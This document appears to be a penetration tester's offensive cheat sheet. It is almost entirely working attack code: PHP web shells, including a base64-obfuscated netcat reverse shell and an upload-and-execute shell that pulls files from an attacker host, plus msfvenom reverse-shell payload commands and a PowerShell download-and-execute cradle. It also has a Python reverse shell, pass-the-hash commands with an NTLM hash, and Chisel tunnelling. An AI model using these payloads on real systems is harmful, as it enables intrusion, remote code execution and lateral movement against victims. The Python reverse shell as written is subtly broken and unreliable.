# PHP


```php
<?php system($_GET["cmd"]); ?>

<?php echo shell_exec($_GET["cmd"]); ?>

<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> 3333 >/tmp/f');?>

<?php exec(base64_decode('cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTxhdHRhY2tlcl9pcD4gPGF0dGFja2VyX3BvcnQ+ID4vdG1wL2Y=')); ?>

  ```

## Secure, simple PHP shell to load and execute code;

```php
<?php
if (isset($_REQUEST['fupload']))
{
	file_put_contents($_REQUEST['fupload'], file_get_contents("http://<ip>:8000/"  .  $_REQUEST['fupload']));
};
if(isset($_REQUEST['fexec']))
{
echo  "<pre>"  .  shell_exec($_REQUEST['fexec']) .  "</pre>";
};
?>
```

  

## Start the listener on the attacker machine;

```bash
nc -lvp 1234
```
  

## Call the script and get the shell;
```
http://<victim ip>/catch.php?fexec=nc.exe <attacker_ip> 1234 -e cmd.exe
```

  
  

------------------------------------------------------------------------------------------------------------------------------

  

#  Msfvenom

  

##Listing payloads (spesific);
```bash
msfvenom -l payloads | grep "cmd/unix" | awk '{print $1}'

  

# .exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=1337 -f exe > asd.exe

 
# .aspx
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f aspx > asd.aspx

 
#.jsp

 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=3333 -f raw > asd.jsp

#.war

msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=3333 -f war > shell.war

  
#python 
msfvenom -p windows/shell_bind_tcp LPORT=9001  -f py -e x86/shikata_ga_nai

  

# .Achat server 

msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://<ip>:8000/rev.ps1')\"" -e x86/unicode_mixed -b '\x00' BufferRegister=EAX -f python

```

----------------------------------------------------------------------------------------------------------

  

# reverse shell cheatsheet

  

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

  

----------------------------------------------------------------------------------------------------------

  

# Upgrading simple shells to fully interactive TTYs

  

##With bash;
```
/bin/bash -i
```
  

##With sh;
```
/bin/sh -i
```
##With echo;  
```  
echo 'os.system('/bin/bash')'
```
  
##With python;
```
python3 -c 'import pty; pty.spawn("/bin/bash")'

python3 -c 'import pty; pty.spawn("/bin/sh")'

python3 -c 'import pty; pty.spawn("/bin/sh")'
```
  
  

##With mawk;
```
mawk 'BEGIN {system("/bin/sh")}'
```
  
  

##With perl;
```
perl —e 'exec "/bin/sh";'

 ``` 
 
##shell with TAB and autocomplete;
```
CTRL +Z

stty raw -echo

fg + [Enter x 2]
```

## with SSH

```
ssh user@<IP> -t bash
```
  
 ### Python reverse shell 
```py
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<ip>",9002))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
import pty
pty.spawn("/bin/bash")

```

  

----------------------------------------------------------------------------------------------------------

# psexec


```
 psexec.py host/user@<ip>
```
  
  ## Using NTLM hash we will get admin shell
```bash
  pth-winexe -U hostname/user//<ip> cmd.exe

  pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 //<ip> cmd

  ```
  
  

# SSH Tunnel

 
Chisel is a fast TCP tunnel, transported over HTTP, secured via SSH

 
`./chisel_1.5.2_linux_amd64 server --port 9002 --reverse `

  

on windows(victim) 
`PS badrobot:\> ./chisel.exe client <attacker ip>:9002 R:910:127.0.0.1:910`

 On Attacker machine 
`ssh -L 127.0.0.1:9002:127.0.0.1:8082 user@<victim ip>`

  
  
  

EvilRM

  
```bash 
./evil-winrm.rb -u <user> -p <passwd> -i <ip>

  ```

